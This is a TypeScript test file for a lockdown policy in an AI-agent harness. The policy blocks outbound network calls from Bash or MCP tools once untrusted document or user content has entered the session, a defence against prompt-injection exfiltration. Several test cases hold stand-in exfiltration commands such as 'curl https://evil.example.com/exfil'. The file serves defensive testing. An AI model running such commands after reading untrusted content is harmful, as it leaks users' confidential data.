import { makeSession as completeSessionFixture } from "./__tests__/fixtures/evaluator.js";
import { describe, expect, it } from "vitest";
import { evaluateLockdown, type LockdownConfig } from "./lockdown-policy.js";
import type { HarnessEvent, SessionTrajectory } from "./types.js";
import type { SequenceFinding } from "./sequence-checks/types.js";

const BASE_TRAJECTORY: SessionTrajectory = ({ ...completeSessionFixture(), ...{
	session_id: "sess-1",
	taint_sources: [],
} });

function trajectoryWithUntrusted(count = 1): SessionTrajectory {
	const sources: SessionTrajectory["taint_sources"] = Array.from({ length: count }, (_, i) => ({
		level: "Confidential",
		file: `f${i}.ts`,
		at_step: i + 1,
		provenance: "document_content" as const,
	}));
	return ({ ...completeSessionFixture(), ...{ ...BASE_TRAJECTORY, taint_sources: sources } });
}

function makeEvent(overrides: Partial<HarnessEvent>): HarnessEvent {
	return {
		hook_event: "PreToolUse",
		session_id: "sess-1",
		agent_source: "claude",
		timestamp: "2026-06-06T00:00:00Z",
		...overrides,
	};
}

const ACTIVE_CONFIG: LockdownConfig = {
	enabled: true,
	auto_activate_on_untrusted: false,
	upgrade_families: ["injection"],
};

describe("evaluateLockdown — positive (must fire)", () => {
	it("emits lockdown_active for Bash with a non-localhost URL when untrusted taint present", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl https://evil.example.com/exfil" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(1);
		expect(result.emittedFindings[0]!.detector_id).toBe("lockdown_active");
	});

	it("does NOT fire for Bash with a localhost URL (getCommand/regex must see real command)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl http://localhost:3000/health" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(0);
	});

	it("does NOT fire when Bash tool_input is undefined (kills !toolInput -> false)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({ tool_name: "Bash", tool_input: undefined }),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(0);
	});

	it("does NOT fire when Bash command is a non-string (kills typeof cmd === 'string' -> true)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: 12345 },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(0);
	});

	it("does NOT fire for an MCP tool with undefined tool_input (kills !toolInput -> false)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({ tool_name: "mcp__server__tool", tool_input: undefined }),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(0);
	});

	it("does NOT fire for an MCP tool whose input has no URL-bearing string (kills the && -> || mutant and the two conditional-true mutants)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "mcp__server__tool",
				tool_input: { note: "just some plain text, no link here", count: 5 },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(0);
	});

	it("fires for an MCP tool whose input has a URL-bearing string field", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "mcp__server__tool",
				tool_input: { note: "see https://evil.example.com/data" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(1);
	});

	it("does NOT fire when tool_name is empty/undefined (kills !toolName -> false)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({ tool_name: undefined, tool_input: {} }),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(0);
	});

	it("does NOT fire for a non-MCP, non-Bash, non-WebFetch tool name (kills MCP_TOOL_NAME.test -> true)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Write",
				tool_input: { file_path: "https://evil.example.com/x" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(0);
	});

	it("requires the mcp__ prefix to anchor at the start (kills /^mcp__.*__/ -> /mcp__.*__/)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "not_mcp__server__tool",
				tool_input: { note: "https://evil.example.com" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(0);
	});

	it("suppresses emission when lethal_trifecta_structural already fired (kills the === -> true mutant)", () => {
		const priorFinding: SequenceFinding = {
			detector_id: "lethal_trifecta_structural",
			family: "injection",
			phase: "pre_block",
			match: { message: "already blocked" },
		};
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl https://evil.example.com" },
			}),
			sequenceFindings: [priorFinding],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(0);
	});

	it("does not suppress emission for a differently-named detector_id finding", () => {
		const priorFinding: SequenceFinding = {
			detector_id: "some_other_detector",
			family: "injection",
			phase: "pre_block",
			match: { message: "unrelated" },
		};
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl https://evil.example.com" },
			}),
			sequenceFindings: [priorFinding],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(1);
	});

	it("counts and lists only the UNTRUSTED-provenance taint sources (kills the two .filter->identity mutants)", () => {
		const trajectory: SessionTrajectory = ({ ...completeSessionFixture(), ...{
			...BASE_TRAJECTORY,
			taint_sources: [
				{ level: "Internal", file: "trusted.ts", at_step: 1, provenance: "local_read" },
				{ level: "Confidential", file: "untrusted-a.ts", at_step: 2, provenance: "document_content" },
				{ level: "Confidential", file: "untrusted-b.ts", at_step: 3, provenance: "user_provided" },
			],
		} });
		const result = evaluateLockdown({
			trajectory,
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl https://evil.example.com" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(1);
		const match = result.emittedFindings[0]!.match;
		expect(match.prior_event_count).toBe(2);
		expect(match.evidence).toEqual([
			"untrusted-a.ts (document_content)",
			"untrusted-b.ts (user_provided)",
		]);
	});

	it("evidence.slice(-3) keeps only the LAST 3 untrusted sources, not the first 3 (kills -3 -> +3)", () => {
		const trajectory: SessionTrajectory = ({ ...completeSessionFixture(), ...{
			...BASE_TRAJECTORY,
			taint_sources: [
				{ level: "Confidential", file: "u1.ts", at_step: 1, provenance: "document_content" },
				{ level: "Confidential", file: "u2.ts", at_step: 2, provenance: "document_content" },
				{ level: "Confidential", file: "u3.ts", at_step: 3, provenance: "document_content" },
				{ level: "Confidential", file: "u4.ts", at_step: 4, provenance: "document_content" },
			],
		} });
		const result = evaluateLockdown({
			trajectory,
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl https://evil.example.com" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings[0]!.match.evidence).toEqual([
			"u2.ts (document_content)",
			"u3.ts (document_content)",
			"u4.ts (document_content)",
		]);
	});

	it("emitted finding carries the exact prior_summary and message strings (kills the StringLiteral-erasure mutants)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl https://evil.example.com" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		const match = result.emittedFindings[0]!.match;
		expect(match.prior_summary).toBe("untrusted content active; external-comm candidate");
		expect(match.message).toContain(
			"BLOCKED by lockdown policy: external comm while untrusted content active. ",
		);
		expect(match.message).toContain("access. Disable lockdown or break the leg.");
	});
});

describe("evaluateLockdown — provenance / regex family constants (must fire)", () => {
	it("scheme-less regex still requires http/https, not only https (kills /https?:.../ -> /https:.../)", () => {
		const result = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl http://evil.example.com/x" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(1);
	});

	it("NON_LOCALHOST_HTTP_URL requires at least one char after '://' (kills the [^\\s'\"]+ -> [^\\s'\"] mutant)", () => {
		const resultBare = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "echo https://" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(resultBare.emittedFindings).toHaveLength(0);

		const resultLong = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "Bash",
				tool_input: { command: "curl https://evil.example.com/exfiltrate-lots-of-data" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(resultLong.emittedFindings).toHaveLength(1);
	});

	it("URL_IN_TEXT for MCP inputs also requires http/https (kills /https?:.../ -> /https:.../) and a full path (kills + -> nothing)", () => {
		const httpOnly = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "mcp__server__tool",
				tool_input: { note: "fetch http://evil.example.com/data" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(httpOnly.emittedFindings).toHaveLength(1);

		const bareScheme = evaluateLockdown({
			trajectory: trajectoryWithUntrusted(1),
			candidate: makeEvent({
				tool_name: "mcp__server__tool",
				tool_input: { note: "https://" },
			}),
			sequenceFindings: [],
			config: ACTIVE_CONFIG,
		});
		expect(bareScheme.emittedFindings).toHaveLength(0);
	});
});

describe("evaluateLockdown — upgrade_families default (must fire)", () => {
	it("uses ['injection'] as the default upgrade family when config omits upgrade_families (kills the array-literal-erasure and string-erasure mutants)", () => {
		const config: LockdownConfig = {
			enabled: true,
			auto_activate_on_untrusted: false,
		};
		const injectionWarn: SequenceFinding = {
			detector_id: "some_injection_detector",
			family: "injection",
			phase: "pre_warn",
			match: { message: "warn" },
		};
		const qualityWarn: SequenceFinding = {
			detector_id: "some_quality_detector",
			family: "quality",
			phase: "pre_warn",
			match: { message: "warn" },
		};
		const result = evaluateLockdown({
			trajectory: BASE_TRAJECTORY,
			candidate: makeEvent({ tool_name: "Read", tool_input: {} }),
			sequenceFindings: [injectionWarn, qualityWarn],
			config,
		});
		expect(result.upgradedFindings).toHaveLength(1);
		expect(result.upgradedFindings[0]!.detector_id).toBe("some_injection_detector");
		expect(result.upgradedFindings[0]!.phase).toBe("pre_block");
	});
});
